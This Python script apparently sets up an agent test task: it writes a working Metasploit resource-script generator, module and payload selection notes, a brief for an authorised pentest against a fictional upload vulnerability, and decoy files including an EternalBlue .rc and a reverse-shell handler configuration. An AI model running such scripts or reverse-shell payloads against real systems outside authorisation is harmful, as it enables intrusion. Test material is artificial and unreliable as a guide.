import os
import random
import json
from pathlib import Path

random.seed(42)

workspace = Path("/workspace")

# --- Directory structure (distractor files) ---
dirs = [
    "scripts",
    "references",
    "engagements/q2_audit/targets",
    "engagements/q2_audit/evidence",
    "engagements/q2_audit/reports",
    "engagements/old_scans/2023",
    "engagements/old_scans/2022",
    "tools/wordlists",
    "tools/templates",
    "logs/archive",
    "logs/current",
]
for d in dirs:
    (workspace / d).mkdir(parents=True, exist_ok=True)

# --- The real build_rc.py script (as referenced by SKILL.md) ---
# This script must be functional so the agent can actually run it.
build_rc_content = r'''#!/usr/bin/env python3
"""
build_rc.py - Generate a repeatable Metasploit .rc resource script.
"""
import argparse
import sys
from pathlib import Path


def parse_args():
    parser = argparse.ArgumentParser(description="Build a Metasploit .rc resource script.")
    parser.add_argument("--module", required=True, help="Metasploit module path")
    parser.add_argument("--rhosts", required=True, help="Target host(s)")
    parser.add_argument("--rport", default=None, help="Target port")
    parser.add_argument("--payload", default=None, help="Payload module path")
    parser.add_argument("--lhost", default=None, help="Listener host")
    parser.add_argument("--lport", default=None, help="Listener port")
    parser.add_argument("--set", action="append", dest="extra_set", metavar="KEY=VALUE",
                        help="Extra set KEY=VALUE options (repeatable)")
    parser.add_argument("--check", action="store_true", help="Include check command before run")
    parser.add_argument("--job", action="store_true", help="Run exploit as background job")
    parser.add_argument("--output", required=True, help="Output .rc file path")
    parser.add_argument("--spool", default=None, help="Enable spool logging to file")
    return parser.parse_args()


def build_rc(args):
    lines = []

    if args.spool:
        lines.append(f"spool {args.spool}")

    lines.append(f"use {args.module}")

    lines.append(f"set RHOSTS {args.rhosts}")

    if args.rport:
        lines.append(f"set RPORT {args.rport}")

    if args.payload:
        lines.append(f"set PAYLOAD {args.payload}")

    if args.lhost:
        lines.append(f"set LHOST {args.lhost}")

    if args.lport:
        lines.append(f"set LPORT {args.lport}")

    if args.extra_set:
        for kv in args.extra_set:
            if "=" not in kv:
                print(f"[!] Skipping malformed --set value: {kv}", file=sys.stderr)
                continue
            key, val = kv.split("=", 1)
            lines.append(f"set {key.strip()} {val.strip()}")

    if args.check:
        lines.append("check")

    if args.job:
        lines.append("exploit -j")
    else:
        lines.append("run")

    if args.spool:
        lines.append("spool off")

    lines.append("exit")

    return "\n".join(lines) + "\n"


def main():
    args = parse_args()
    content = build_rc(args)
    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(content)
    print(f"[+] Resource script written to: {out}")


if __name__ == "__main__":
    main()
'''
(workspace / "scripts" / "build_rc.py").write_text(build_rc_content)

# --- references/module-selection.md (as referenced by SKILL.md) ---
module_selection_content = """# Module Selection Heuristics

## Inputs Required Before Choosing a Module

- Service type and exposed endpoint
- Product name and version confidence level
- Authentication requirement
- Target OS and architecture (if known)
- Reliability constraints (production safety, maintenance window)

## Selection Rules

1. Prefer modules with explicit compatibility to observed version range.
2. Prefer modules with non-destructive checks and stable public usage.
3. Prefer payloads that match objective and minimize operational impact.
4. Avoid noisy options unless explicitly approved in scope.
5. Record why one module was chosen over alternatives.

## Common Service-to-Module Discovery Patterns

### HTTP/Web
- Search: `search type:exploit service:http <product|cve>`
- Verify options: `TARGETURI`, `SSL`, `VHOST`, auth fields
- Typical payload families:
  - `linux/x64/meterpreter/reverse_tcp`
  - `cmd/unix/reverse_bash`
  - `php/meterpreter/reverse_tcp`

### SMB/Windows
- Search: `search type:exploit service:smb <product|cve>`
- Verify options: `RHOSTS`, `RPORT`, `SMBUser`, `SMBPass`, domain options
- Typical payload families:
  - `windows/x64/meterpreter/reverse_tcp`
  - `windows/shell/reverse_tcp`

### SSH
- Search: `search type:exploit service:ssh <product|cve>`
- Verify options: credentials, key paths, brute-force limits
- Typical payload families:
  - command or session payloads aligned with module support

### Database Services
- Search: `search type:exploit mysql` or `search type:auxiliary postgres`
- Verify options: DB credentials, database name, TLS settings
- Prefer auxiliary enumeration before exploit where possible

## Payload Choice Guidelines

1. Choose architecture-compatible payloads first.
2. Choose staged vs stageless based on network controls and reliability.
3. Choose meterpreter only when its post-exploitation features are required.
4. Keep fallback payloads ready for one-step retries.

## Verification Checklist Before Execution

- `show options` has no missing required fields
- Payload listener values are reachable from target network
- Target host is in approved scope
- Check mode is enabled when module supports it
- Logging method is defined (`spool` or equivalent)
"""
(workspace / "references" / "module-selection.md").write_text(module_selection_content)

# --- references/workflow.md ---
workflow_content = """# Execution and Reporting Workflow

## 1. Pre-Execution Checklist

- Confirm explicit authorization and current test window.
- Confirm in-scope targets and prohibited techniques.
- Confirm rollback and communication channel for incidents.
- Confirm listener host/port availability.
- Confirm module options and payload alignment.

## 2. Command Sequence (Recommended)

```bash
msfconsole -q
search type:exploit <keyword-or-cve>
use exploit/<path>
show options
show payloads
```

Build and execute a resource script:

```bash
python3 scripts/build_rc.py --module exploit/<path> --rhosts <target> --check --output run.rc
msfconsole -q -r run.rc
```

## 3. Troubleshooting Loop

When execution fails, change one variable per iteration:

1. Validate target reachability and service state.
2. Validate version match assumptions.
3. Validate payload compatibility.
4. Validate required options and authentication values.
5. Retry with controlled module or payload fallback.

Record each change and outcome.

## 4. Evidence Collection Fields

- Timestamp and operator
- Target and scope reference
- Module and payload identifiers
- Effective option set (redacted where needed)
- Check result and exploit result
- Session metadata (`sessions -l`)
- Proof artifact summary

## 5. Reporting Template (Concise)

### Objective
- What was tested and why

### Procedure
- Exact commands/resource script used

### Procedure
- Exact commands/resource script used

### Result
- Success/failure and confidence level

### Impact
- Practical security implication

### Remediation
- Actionable fixes and validation method
"""
(workspace / "references" / "workflow.md").write_text(workflow_content)

# --- THE MAIN PROBLEM: messy target brief ---
target_brief = """
QUARTERLY COMPLIANCE ASSESSMENT BRIEF — Q2
Issued by: InfoSec Compliance Team
Classification: INTERNAL USE ONLY

TARGET SYSTEM
  Hostname/IP:       10.14.22.7
  Environment:       Staging (pre-production), authorized for testing
  Test window:       2024-06-10 02:00–06:00 UTC
  Owner approval:    Signed off by CTO (ticket #SEC-2244)

SERVICE DETAILS
  Observed service:  HTTP (port 8443)
  Application:       FinTrack Web Portal v2.3.1
  Technology stack:  Linux x86_64, Apache/2.4.51, PHP 7.4
  Endpoint of note:  /portal/upload  (file handling endpoint, suspected vuln)
  Authentication:    None required for /portal/upload (unauthenticated endpoint)

KNOWN VULNERABILITY CONTEXT
  Internal ticket:   BUG-9981
  Suspected module:  exploit/linux/http/fintrack_upload_rce
  CVE reference:     CVE-2024-31337
  Confidence:        High (confirmed via vendor advisory)

CONSTRAINTS & RULES OF ENGAGEMENT
  - No DoS or destructive payloads
  - No persistence mechanisms
  - No data exfiltration beyond session proof
  - Listener (attack box): 10.14.22.1 , port 5555
  - Background job execution required (do not block console)

DELIVERABLES REQUIRED
  1. A resource script named: q2_fintrack_assessment.rc
     Must be placed in: engagements/q2_audit/
  2. A plain-text findings report named: q2_fintrack_report.txt
     Must be placed in: engagements/q2_audit/reports/
     Must follow the standard reporting structure from our internal workflow docs.

NOTES
  - Previous scan logs in engagements/old_scans/ are for reference only
  - Do NOT reuse stale configs from old engagements without review
"""
(workspace / "engagements" / "q2_audit" / "targets" / "target_brief.txt").write_text(target_brief)

# --- Distractor files ---

# Old stale RC files that should NOT be reused
stale_rc = """\
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.14.22.7
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
run
"""
(workspace / "engagements" / "old_scans" / "2023" / "old_scan.rc").write_text(stale_rc)

stale_rc2 = """\
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.99
set LPORT 9999
run
"""
(workspace / "engagements" / "old_scans" / "2022" / "handler.rc").write_text(stale_rc2)

# Partial notes (distractor)
notes = """\
TODO: double-check fintrack module options
- TARGETURI might be /portal/upload or /upload — confirm with dev team
- lport from brief says 5555
"""
(workspace / "engagements" / "q2_audit" / "evidence" / "notes.txt").write_text(notes)

# Wordlist distractors
(workspace / "tools" / "wordlists" / "common_passwords.txt").write_text("admin\npassword\n123456\nletmein\n")
(workspace / "tools" / "wordlists" / "web_paths.txt").write_text("/admin\n/login\n/upload\n/api\n")

# Template distractors
old_report_template = """\
# OLD REPORT TEMPLATE v1 (DEPRECATED)
## Summary
## Steps
## Findings
## Notes
"""
(workspace / "tools" / "templates" / "old_report_template.txt").write_text(old_report_template)

# Logs
(workspace / "logs" / "archive" / "2023_q4.log").write_text("[2023-12-01] scan started\n[2023-12-01] module loaded\n")
(workspace / "logs" / "current" / "session.log").write_text("[INFO] no active sessions\n")

# A decoy config file
decoy_config = {
    "last_target": "10.14.22.7",
    "last_module": "exploit/linux/http/old_module",
    "last_payload": "linux/x86/meterpreter/reverse_tcp",
    "lhost": "10.0.0.1",
    "lport": 4444
}
(workspace / "engagements" / "q2_audit" / "evidence" / "last_run_config.json").write_text(
    json.dumps(decoy_config, indent=2)
)

# Another distractor: partial outdated report
(workspace / "engagements" / "old_scans" / "2023" / "partial_report.txt").write_text("""\
Target: 10.14.22.7
Module: exploit/linux/http/old_vuln
Result: Module check failed - version mismatch
""")

print("[gen_inputs] Workspace initialized successfully.")